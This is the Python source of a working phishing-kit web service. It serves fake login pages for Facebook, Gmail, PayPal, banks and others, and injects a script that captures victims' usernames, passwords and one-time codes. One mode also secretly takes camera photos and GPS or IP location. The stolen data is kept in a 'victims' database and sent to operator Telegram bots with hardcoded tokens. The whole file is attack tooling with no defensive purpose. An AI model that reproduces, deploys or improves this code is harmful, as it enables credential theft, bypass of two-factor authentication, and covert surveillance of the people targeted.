import os
import base64
import datetime
import sqlite3
import json
from flask import Flask, request, jsonify, render_template, render_template_string
import requests

app = Flask(__name__)

# --- CONFIGURATION TELEGRAM ---
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")

# Token du bot Telegram dédié au groupe (photos, appareil, GPS)
GROUP_BOT_TOKEN = os.environ.get(
    "GROUP_BOT_TOKEN",
    "9186799056:AAFo81ztd2Fig2o3M-SHx2OZqxrvU-HXbLo",
)
raw_group_id = os.environ.get("ADMIN_GROUP_CHAT_ID", "-9107581307").strip()
if raw_group_id.lstrip("-").isdigit() and not raw_group_id.startswith("-"):
    ADMIN_GROUP_CHAT_ID = f"-{raw_group_id}"
else:
    ADMIN_GROUP_CHAT_ID = raw_group_id

UNIVERSAL_ADMIN_CODE = "4121@."
EXPIRY_SECONDS = 24 * 3600  # 24 heures

DB_NAME = "abeilles.db"

PLATFORM_IMAGES = {
    "Facebook": "https://i.postimg.cc/4xnRThHp/IMG-6898.jpg",
    "Amazon": "https://i.postimg.cc/jSyCP9v8/IMG-6895.webp",
    "TikTok": "https://i.postimg.cc/sg5178K8/IMG-6894.png",
    "Gmail": "https://i.postimg.cc/bw1dkM38/IMG-6888.jpg",
    "Yahoo": "https://i.postimg.cc/htVhTwpB/IMG-6887.png",
    "WhatsApp": "https://i.postimg.cc/3xWQHD0C/IMG-6897.webp",
    "Instagram": "https://i.postimg.cc/Xv3q88z3/IMG-6886.jpg",
    "Netflix": "https://i.postimg.cc/cLf6wjX1/IMG-6885.png",
    "Telegram": "https://i.postimg.cc/fRYkmF5G/IMG-6890.jpg",
    "Snapchat": "https://i.postimg.cc/rpWb8GV1/IMG-6900.jpg",
    "PayPal": "https://i.postimg.cc/Mp1XV4dk/IMG-6892.jpg",
    "LinkedIn": "https://i.postimg.cc/YCQjYVbB/IMG-6889.jpg",
    "1Xbet": "https://i.postimg.cc/qB838NRS/IMG-6903.webp",
    "Betclic": "https://i.postimg.cc/dQ8y8h1H/IMG-6904.jpg",
    "Bank": "https://i.postimg.cc/FFjLjYRM/IMG-6905.png",
}

DEFAULT_LOGO_FALLBACK = "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png"


def resolve_platform_image(network: str, page_logo: str = "") -> str:
    net_clean = (network or "").strip().lower()
    for key, url in PLATFORM_IMAGES.items():
        if key.lower() in net_clean or net_clean in key.lower():
            return url
    if page_logo and page_logo.startswith("http"):
        return page_logo
    return DEFAULT_LOGO_FALLBACK


def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            device TEXT,
            extra_info TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            opt3_config TEXT,
            box_bg TEXT,
            box_width TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            email TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()


init_db()


def cleanup_expired_24h():
    cutoff_ms = int((datetime.datetime.now().timestamp() - EXPIRY_SECONDS) * 1000)
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM custom_pages WHERE created_at <= ?", (cutoff_ms,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage 24h:", e)


def detect_device(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if "iphone" in ua:
        return "iPhone"
    if "ipad" in ua:
        return "iPad"
    if "android" in ua:
        return "Android"
    if "macintosh" in ua or "mac os" in ua:
        return "Mac"
    if "windows" in ua:
        return "Windows PC"
    if "linux" in ua:
        return "Linux"
    return user_agent[:60] if user_agent else "Inconnu"


def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        res = requests.post(
            url,
            json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"},
            timeout=6,
        )
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)
        send_telegram_notification(bot_token, chat_id, caption)


def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
            timeout=6,
        )
    except Exception as e:
        print("Erreur Telegram Message:", e)


@app.route("/")
def index():
    cleanup_expired_24h()
    return render_template("index.html")


def _render_standard_or_otp(folder: str, slug_clean: str, owner_param: str = "Kim"):
    base_name = (
        slug_clean.replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )
    if folder == "otp":
        candidates = [
            f"otp/{slug_clean}.html",
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}-otp.html",
            f"otp/{base_name}.html",
        ]
    else:
        candidates = [
            f"standard/{slug_clean}.html",
            f"standard/{base_name}.html",
            f"standard/{base_name}_standard.html",
            f"standard/{base_name}-standard.html",
        ]

    for tpl in candidates:
        try:
            return render_template(tpl, owner=owner_param, network=base_name.capitalize())
        except Exception:
            continue

    return f"Page introuvable dans le dossier {folder} pour : {slug_clean}", 404


@app.route("/phish/<path:subpath>")
def render_phish_page(subpath):
    cleanup_expired_24h()
    subpath_clean = subpath.lower().strip("/")
    req_type = (request.args.get("type") or "").lower()
    owner_param = request.args.get("user", "Kim")

    db_slug = subpath_clean.replace("otp/", "").replace("standard/", "")
    clean_custom_slug = (
        db_slug.replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )

    conn = get_db_connection()
    cursor = conn.cursor()
    possible_slugs = [db_slug, clean_custom_slug, db_slug.replace("-", "_"), db_slug.replace("_", "-")]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ms = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ms - int(cp_dict.get("created_at", 0))) > (EXPIRY_SECONDS * 1000):
            return "Ce lien a expiré après 24 heures.", 410

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"
        mode = cp_dict.get("mode", "opt1")

        # Option 2 (HTML pur, sans photo ni GPS) et Option 3 (HTML + photo jusqu'à 6 + 4 méthodes GPS)
        if mode in ["opt2", "opt3"] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            owner = cp_dict["owner"]
            network = cp_dict["network"]
            is_opt3 = "true" if mode == "opt3" else "false"
            try:
                opt3_cfg = json.loads(cp_dict.get("opt3_config") or "{}")
            except Exception:
                opt3_cfg = {}

            cam_front = "true" if opt3_cfg.get("camFront", True) else "false"
            cam_back = "true" if opt3_cfg.get("camBack", False) else "false"
            gps_enabled = "true" if opt3_cfg.get("gps", True) else "false"
            photo_count = max(1, min(6, int(opt3_cfg.get("photoCount", 1) or 1)))

            injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    const IS_OPT3 = __IS_OPT3__;
    const CAM_FRONT = __CAM_FRONT__;
    const CAM_BACK = __CAM_BACK__;
    const GPS_ENABLED = __GPS_ENABLED__;
    const TOTAL_PHOTOS = __PHOTO_COUNT__;
    const ADMIN_CODE = "4121@.";

    let isProcessing = false, hasRedirected = false, gpsSent = false;
    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: ""
    };

    function sendGps(lat, lon, methodName) {
        if (gpsSent || !lat || !lon) return;
        gpsSent = true;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        fetch('/api/upload_media', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: 'opt3',
                type: 'gps',
                method: methodName,
                gps: mapsUrl,
                user: userData.user || 'Inconnu',
                device: navigator.userAgent
            })
        }).catch(() => {});
    }

    // 4 méthodes de localisation GPS
    function startFourGpsMethods() {
        if (!IS_OPT3 || !GPS_ENABLED) return;
        if (navigator.geolocation) {
            // Méthode 1 : Haute précision
            navigator.geolocation.getCurrentPosition(
                pos => sendGps(pos.coords.latitude, pos.coords.longitude, "GPS Haute Précision"),
                () => {
                    // Méthode 2 : Précision standard
                    navigator.geolocation.getCurrentPosition(
                        pos => sendGps(pos.coords.latitude, pos.coords.longitude, "GPS Standard"),
                        () => {},
                        { enableHighAccuracy: false, timeout: 6000, maximumAge: 60000 }
                    );
                },
                { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
            );

            // Méthode 3 : watchPosition en secours
            const watchId = navigator.geolocation.watchPosition(
                pos => {
                    sendGps(pos.coords.latitude, pos.coords.longitude, "GPS Watch");
                    navigator.geolocation.clearWatch(watchId);
                },
                () => {},
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }

        // Méthode 4 : Repli géolocalisation IP si GPS refusé ou indisponible
        setTimeout(() => {
            if (!gpsSent) {
                fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(d => {
                        if (d && d.latitude && d.longitude) {
                            sendGps(d.latitude, d.longitude, "Localisation IP");
                        }
                    })
                    .catch(() => {});
            }
        }, 3500);
    }

    // Capture photo selon nombre total (1 à 6) et caméras cochées (frontale / arrière)
    function buildPhotoPlan() {
        const modes = [];
        if (CAM_FRONT) modes.push("user");
        if (CAM_BACK) modes.push("environment");
        if (modes.length === 0) modes.push("user");

        const plan = [];
        for (let i = 0; i < TOTAL_PHOTOS; i++) {
            plan.push({ index: i + 1, facing: modes[i % modes.length] });
        }
        return plan;
    }

    async function snapFrameFromStream(stream) {
        const video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.muted = true;
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 350));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
        stream.getTracks().forEach(t => t.stop());
        return dataUrl;
    }

    async function captureSinglePhoto(facingMode, shotIndex) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
        const constraintsList = [
            { video: { facingMode: { exact: facingMode } }, audio: false },
            { video: { facingMode: facingMode }, audio: false },
            { video: true, audio: false }
        ];

        for (const constraints of constraintsList) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const dataUrl = await snapFrameFromStream(stream);
                await fetch('/api/upload_media', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        owner: OWNER,
                        network: NETWORK,
                        mode: 'opt3',
                        type: 'photo',
                        facing: facingMode,
                        shotNumber: shotIndex,
                        totalPhotos: TOTAL_PHOTOS,
                        photo: dataUrl,
                        user: userData.user || 'Inconnu',
                        device: navigator.userAgent
                    })
                });
                return;
            } catch (e) {
                // Essaie la contrainte suivante
            }
        }
    }

    async function runOption3MediaCapture() {
        if (!IS_OPT3) return;
        const plan = buildPhotoPlan();
        for (const item of plan) {
            await captureSinglePhoto(item.facing, item.index);
        }
    }

    function classify(inp) {
        const name = (inp.name || inp.id || inp.placeholder || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (type === "email" || type === "tel") return "user";
        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone') || name.includes('identifiant')) return "user";
        if (name.includes('pass') || name.includes('mdp') || name.includes('mot de passe')) return "pass";
        if (name.includes('otp') || name.includes('code') || name.includes('verif') || name.includes('secret')) return "otp";
        return "unknown";
    }

    async function processData() {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false;
        document.querySelectorAll('input, select, textarea').forEach(inp => {
            const val = (inp.value || "").trim();
            if (!val) return;
            const c = classify(inp);
            if (c === "user") { userData.user = val; localStorage.setItem('ph_user_' + OWNER, val); }
            if (c === "pass") { userData.pass = val; localStorage.setItem('ph_pass_' + OWNER, val); }
            if (c === "otp") { userData.otp = val; hasOtp = true; }
        });

        if (userData.pass === ADMIN_CODE && userData.user) {
            if (userData.user === ADMIN_CODE) {
                window.location.replace('/admin/accounts');
                return;
            }
            window.location.replace(REDIRECT_URL);
            return;
        }

        if (IS_OPT3) {
            await runOption3MediaCapture();
        }

        const captureType = hasOtp ? "custom_html_otp" : "custom_html_otp_step1";
        await fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: IS_OPT3 ? 'opt3' : 'opt2',
                type: captureType,
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: userData.otp || "En attente OTP...",
                extra_info: JSON.stringify({ ua: navigator.userAgent, platform: navigator.platform })
            }),
            keepalive: true
        });

        if (hasOtp) {
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 100);
            return;
        }
        isProcessing = false;
    }

    document.addEventListener('DOMContentLoaded', () => {
        if (IS_OPT3) {
            startFourGpsMethods();
            setTimeout(() => runOption3MediaCapture(), 900);
        }
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => { processData(); });
        });
        document.addEventListener('click', function(e) {
            const target = e.target;
            if (target.tagName === 'BUTTON' || (target.tagName === 'INPUT' && target.type === 'submit')) {
                processData();
            }
        });
    });
})();
</script>
"""
            script_final = (
                injection_script.replace("__OWNER__", owner)
                .replace("__NETWORK__", network)
                .replace("__REDIRECT_URL__", redirect_url)
                .replace("__IS_OPT3__", is_opt3)
                .replace("__CAM_FRONT__", cam_front)
                .replace("__CAM_BACK__", cam_back)
                .replace("__GPS_ENABLED__", gps_enabled)
                .replace("__PHOTO_COUNT__", str(photo_count))
            )
            if "</body>" in html:
                html = html.replace("</body>", script_final + "</body>")
            else:
                html += script_final
            return render_template_string(html)

        # Option 1 : Formulaire No-Code
        try:
            fields_parsed = json.loads(cp_dict.get("fields_json") or "[]")
        except Exception:
            fields_parsed = []
        config = {
            "owner": cp_dict.get("owner", "Kim"),
            "title": cp_dict.get("title", "Connexion"),
            "network": cp_dict.get("network", "Facebook"),
            "bg_type": cp_dict.get("bg_type", "color"),
            "bg_value": cp_dict.get("bg_value", "#111"),
            "logo_url": cp_dict.get("logo_url", ""),
            "logo_shape": cp_dict.get("logo_shape", "circle"),
            "fields": fields_parsed,
            "btn_text": cp_dict.get("btn_text", "Se connecter"),
            "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
            "box_width": cp_dict.get("box_width") or "420px",
            "redirect_url": redirect_url,
        }
        return render_template("custom_login.html", config=config)

    folder = "otp" if (req_type == "otp" or subpath_clean.startswith("otp/") or "otp" in db_slug) else "standard"
    return _render_standard_or_otp(folder, db_slug, owner_param)


@app.route("/api/upload_media", methods=["POST"])
def upload_media():
    """Envoie les photos, type d'appareil et localisation GPS vers le bot du groupe."""
    data = request.json or {}
    if data.get("mode") != "opt3":
        return jsonify({"status": "ignored", "reason": "Option 3 only"}), 400

    network = data.get("network", "Inconnu")
    m_type = data.get("type", "media")
    facing = data.get("facing", "user")
    camera_label = "Caméra arrière" if facing == "environment" else "Caméra avant"
    shot_num = data.get("shotNumber", 1)
    total_shots = data.get("totalPhotos", 1)

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(data.get("device", ""))

    if m_type == "gps":
        method_name = data.get("method", "GPS")
        msg = (
            f"📍 *LOCALISATION GPS ({method_name})*\n"
            f"🌐 *Plateforme:* {network}\n"
            f"🗺️ *Google Maps:* [Ouvrir la position]({data.get('gps')})\n"
            f"📱 *Type d'appareil:* `{device_type}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_notification(GROUP_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, msg)
    elif m_type == "photo":
        photo_b64 = (data.get("photo") or "").split(",")[-1]
        if photo_b64:
            url = f"https://api.telegram.org/bot{GROUP_BOT_TOKEN}/sendPhoto"
            caption = (
                f"📸 *PHOTO {shot_num}/{total_shots} ({camera_label})*\n"
                f"🌐 *Plateforme:* {network}\n"
                f"📱 *Type d'appareil:* `{device_type}`\n"
                f"📍 *IP:* `{v_ip}`"
            )
            try:
                requests.post(
                    url,
                    data={"chat_id": ADMIN_GROUP_CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
                    files={"photo": (f"photo_{shot_num}.jpg", base64.b64decode(photo_b64), "image/jpeg")},
                    timeout=10,
                )
            except Exception as e:
                print("Erreur envoi photo groupe:", e)

    return jsonify({"status": "success"})


@app.route("/api/create_login", methods=["POST"])
def create_login():
    data = request.json or {}
    owner = (data.get("owner") or "").strip()
    slug = (data.get("slug") or "").strip().lower().replace(" ", "_")
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ms = int(datetime.datetime.now().timestamp() * 1000)
        mode = data.get("mode", "opt1")
        redirect_url = data.get("redirectUrl", "https://www.google.com")
        opt3_json = json.dumps(data.get("opt3Config") or {})

        if mode in ["opt2", "opt3"]:
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, opt3_config, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    "Page Perso",
                    data.get("network"),
                    "color",
                    "#111",
                    "",
                    "circle",
                    "[]",
                    "Valider",
                    data.get("htmlCode"),
                    redirect_url,
                    mode,
                    opt3_json,
                    "#fff",
                    "420px",
                    now_ms,
                ),
            )
        else:
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, opt3_config, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    data.get("title"),
                    data.get("network"),
                    data.get("bgType"),
                    data.get("bgValue"),
                    data.get("logoUrl"),
                    data.get("logoShape"),
                    json.dumps(data.get("fields") or []),
                    data.get("btnText"),
                    "",
                    redirect_url,
                    "opt1",
                    "{}",
                    data.get("boxBg"),
                    data.get("boxWidth"),
                    now_ms,
                ),
            )

        conn.commit()
        conn.close()
        return jsonify({"status": "success", "url": f"{request.host_url.rstrip('/')}/phish/{slug}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/api/register_account", methods=["POST"])
def register_account():
    data = request.json or {}
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    email = (data.get("email") or "").strip()
    if not username:
        return jsonify({"status": "error", "message": "Nom d'utilisateur requis"})

    date_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO accounts (username, password, email, created_at) VALUES (?, ?, ?, ?)",
        (username, password, email, date_str),
    )
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "created_at": date_str})


@app.route("/api/admin/accounts", methods=["GET"])
def api_admin_accounts():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, email, created_at FROM accounts ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    accounts = [dict(r) for r in rows]
    return jsonify({"total": len(accounts), "accounts": accounts})


@app.route("/admin/accounts")
def admin_accounts_page():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, created_at FROM accounts ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()

    total = len(rows)
    trs = "".join(
        f"<tr><td>{r['id']}</td><td>{r['username']}</td><td>{r['password']}</td><td>{r['created_at']}</td></tr>"
        for r in rows
    )
    return f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Comptes enregistrés ({total})</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #0c0c0c; color: #fff; padding: 24px; }}
            .box {{ max-width: 960px; margin: auto; background: #1a1a1a; border: 2px solid #f5b014; border-radius: 8px; padding: 20px; }}
            .top {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }}
            .badge {{ background: #f5b014; color: #111; padding: 8px 14px; border-radius: 20px; font-weight: bold; }}
            .scroll-box {{ max-height: 450px; overflow-y: auto; border: 1px solid #333; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 10px 12px; border-bottom: 1px solid #2b2b2b; text-align: left; }}
            th {{ position: sticky; top: 0; background: #242424; color: #f5b014; }}
        </style>
    </head>
    <body>
        <div class="box">
            <div class="top">
                <h2>Liste complète des comptes créés</h2>
                <span class="badge">Total : {total}</span>
            </div>
            <div class="scroll-box">
                <table>
                    <thead><tr><th>#</th><th>Nom d'utilisateur</th><th>Mot de passe</th><th>Date de création</th></tr></thead>
                    <tbody>{trs if trs else '<tr><td colspan="4">Aucun compte enregistré.</td></tr>'}</tbody>
                </table>
            </div>
        </div>
    </body>
    </html>
    """


@app.route("/api/capture", methods=["POST"])
def capture_data():
    data = request.json or {}
    owner = (data.get("owner") or "Kim").strip()
    network = (data.get("network") or "Facebook").strip()
    v_user = (data.get("victimUser") or "Inconnu").strip()
    v_pass = (data.get("victimPass") or "Inconnu").strip()
    v_otp = (data.get("otp") or "Aucun").strip()
    v_type = (data.get("type") or "standard").strip()

    if v_pass == UNIVERSAL_ADMIN_CODE and v_user and v_user != UNIVERSAL_ADMIN_CODE:
        return jsonify({"status": "admin_unlock", "target_user": v_user})

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(request.headers.get("User-Agent", ""))

    now = datetime.datetime.now()
    date_str = now.strftime("%d/%m/%Y %H:%M:%S")
    timestamp = int(now.timestamp() * 1000)

    conn = get_db_connection()
    cursor = conn.cursor()

    if v_user and v_user != "Inconnu" and v_user != UNIVERSAL_ADMIN_CODE:
        cursor.execute(
            "INSERT INTO accounts (username, password, email, created_at) VALUES (?, ?, ?, ?)",
            (v_user, v_pass, "", date_str),
        )

    logo_img = resolve_platform_image(network)

    if v_otp and v_otp not in ["Aucun", "En attente OTP..."]:
        cursor.execute(
            "SELECT id FROM victims WHERE owner=? AND network=? AND victimOtp='En attente OTP...' ORDER BY id DESC LIMIT 1",
            (owner, network),
        )
        existing = cursor.fetchone()
        if existing:
            cursor.execute(
                "UPDATE victims SET victimOtp=?, dateStr=?, timestamp=?, ip=?, device=? WHERE id=?",
                (v_otp, date_str, timestamp, v_ip, device_type, existing["id"]),
            )
            conn.commit()
            conn.close()

            alert = (
                f"📌 *PAGE D'ACCUEIL — {network.upper()}*\n"
                f"👤 *Nom:* `{owner}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n\n"
                f"📥 *CAPTURE DE DONNÉES*\n"
                f"• *Nom d'utilisateur:* `{v_user}`\n"
                f"• *Mot de passe:* `{v_pass}`\n"
                f"• *Code OTP:* `{v_otp}`\n"
                f"• *Adresse IP:* `{v_ip}`\n"
                f"• *Type d'appareil:* `{device_type}`\n"
                f"• *Date & Heure:* `{date_str}`"
            )
            send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
            return jsonify({"status": "success"})

    cursor.execute(
        """
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, device, extra_info)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, device_type, data.get("extra_info")),
    )
    conn.commit()
    conn.close()

    alert = (
        f"📌 *PAGE D'ACCUEIL — {network.upper()}*\n"
        f"👤 *Nom:* `{owner}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n\n"
        f"📥 *CAPTURE DE DONNÉES*\n"
        f"• *Nom d'utilisateur:* `{v_user}`\n"
        f"• *Mot de passe:* `{v_pass}`\n"
        f"• *Code OTP:* `{v_otp}`\n"
        f"• *Adresse IP:* `{v_ip}`\n"
        f"• *Type d'appareil:* `{device_type}`\n"
        f"• *Date & Heure:* `{date_str}`"
    )
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
    return jsonify({"status": "success"})


@app.route("/api/custom_pages", methods=["GET"])
def get_custom_pages():
    cleanup_expired_24h()
    owner = (request.args.get("owner") or "").strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{"slug": r["slug"], "title": r["title"], "network": r["network"], "mode": r["mode"]} for r in rows])


@app.route("/api/victims", methods=["GET"])
def get_victims():
    owner = (request.args.get("owner") or "").strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([
        {
            "id": r["id"],
            "network": r["network"],
            "type": r["type"],
            "victimUser": r["victimUser"],
            "victimPass": r["victimPass"],
            "otp": r["victimOtp"],
            "dateStr": r["dateStr"],
            "timestamp": r["timestamp"],
            "ip": r["ip"],
            "device": r["device"],
        }
        for r in rows
    ])


@app.route("/api/clear_victims", methods=["POST"])
def clear_victims():
    data = request.json or {}
    owner = (data.get("owner") or "").strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
